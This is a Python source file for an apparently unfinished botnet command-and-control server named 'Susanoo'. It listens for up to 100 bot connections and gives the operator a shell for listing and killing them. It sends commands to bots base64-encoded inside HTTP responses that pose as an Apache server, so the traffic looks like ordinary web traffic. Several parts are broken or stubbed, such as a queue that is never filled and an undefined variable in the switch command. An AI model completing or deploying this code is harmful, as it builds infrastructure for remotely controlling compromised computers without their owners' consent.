#!/usr/bin/python

import socket
import sys
import os
import multiprocessing as mp
import threading
import queue
import time
import re
import base64
# from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer

q = queue.Queue()
process_list = []
ip_list = []
host_list = []



def clientExecuter(client,client_addr,q):
    cmd_queue = queue.Queue()
    while(True):
        
        data = client.recv(4096)
        data = data.decode('utf-8')
        # data = data.encode('utf-8')
        print("[DEBUG] data Recieved\n{}".format(data))
        send_data = 'HTTP/1.0 200 OK\r\nServer: Apache/2.2.14 (Win32)\r\nContent-Type: text/html\r\n\r\n'
        cmd = cmd_queue.get()

        if(re.findall('POST',data[:20])):
            send_data = send_data + 'POST request is recieved\r\n'
            # it means this is a result of some past request
        elif(re.findall('GET',data[:20])):
            base = base64.b64encode(cmd).decode('utf-8')
            send_data = send_data + '<html>\n<body>' + base + '</body>\n</html>\r\n'
        else:
            send_data = send_data + 'NO Request method found\r\n'
        send_data = send_data.encode('utf-8')
        client.sendall(send_data)
    client.close()
    # Write code to get data from pipe and add commands to queue to execute and pipe back the data from the queue which stores result
    


def switch(process_name):
    print("\n")
    # write code to switch cmd shell between different processes

def handlerExecuter(cmd):
    global process_list
    global ip_list
    global host_list
    # print("[DEBUG] cmd:{}\n".format(cmd))
    if(cmd[:4]=='kill'):    # kill specified connection
        proc_name = cmd[5:]
        flag = 0
        for i in range(len(process_list)):
            if(process_list[i].name == proc_name):
                process_list[i].terminate()
                del process_list[i]
                del ip_list[i]
                del host_list[i]
                print("[+] Process " + proc_name + " is terminated\n")
                flag = 1
                break
        if(flag == 0):
            print("[-] Process not found\n")
    elif(cmd[:7]=="killall"):   # kill all conntections
        flag = 0
        for i in range(len(process_list)):
            flag = 1
            proc_name = process_list[i].name
            process_list[i].terminate()
            del process_list[i]
            del ip_list[i]
            del host_list[i]
            print("[+] Process " + proc_name + " is terminated\n")
        if(flag == 0):
            print("[-] Process not found\n")
    elif(cmd[:4] == "list"):    # list all the connected hosts
        # print("[DEBUG] inside list")
        for i in range(len(process_list)):
            proc_name = process_list[i]
            ip_address = ip_list[i]
            hostname = host_list[i]
            print("{} {} {}".format(proc_name,ip_address,hostname))
    elif(cmd[:6] == "switch"):
        switch(process_name)
        # print("[DEBUG] switch")
    else:
        print("\nCOMMANDS:\nlist\t\t\t:\tto list all the connected devices\nkill {processname}\t:\tkill the specified connection\nkillall\t\t\t:\tkill all connected\nswitch {processname}\t:\tswitch to different connection\n")
        


def handlerCmdShell(q):
    global process_list
    while(True):
        handler_cmd = str(input("Susanoo> "))
        if(handler_cmd == ""):
            pass
        elif(handler_cmd == "exit"):
            print("\n[+] Killing all running processes\n")
            for proc in process_list:
                time.sleep(0.1)
                proc.join()
            time.sleep(2)
            os._exit(0)
            # Close all the process one by one and exit the program after that
        else:
            handlerExecuter(handler_cmd)



def listener(lhost,lport,q):
    global process_list
    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((lhost,lport))
    sock.listen(100)
    # Started the listener which can handle 100 connections.
    print ("[+] Starting Botnet listener on tcp://" + lhost + ":" + str(lport) + "\n")
        
    handler_cmd_thread = threading.Thread(target=handlerCmdShell,args=(q,))
    handler_cmd_thread.start()
    # Handler cmd shell started here.
    # It is running as serperate thread to give us an free cmd shell while listener runs in background.

    while(len(process_list)<100):
        (client,client_addr) = sock.accept()
        new_process = mp.Process(target=clientExecuter,args=(client,client_addr,q))
        process_list.append(new_process)
        new_process.start()
        print("[+] {} connected as {}".format(client_addr[0],new_process.name))
        # Created new process for every connection that I get and save the process in process_list 
    sock.close()




def main():
    if(len(sys.argv) < 3):
        print("[!] Useage:\n[+] python {sys.argv[0]} LHOST LPORT\n")
    else:
        try:
            lhost = sys.argv[1]
            lport = int(sys.argv[2])
            listener(lhost,lport,q)

        except Exception as ex:
            print("\n[-] Unable to start a handler. Reason: {}\n".format(ex))
            # exit(0)



if __name__ == '__main__':
    main()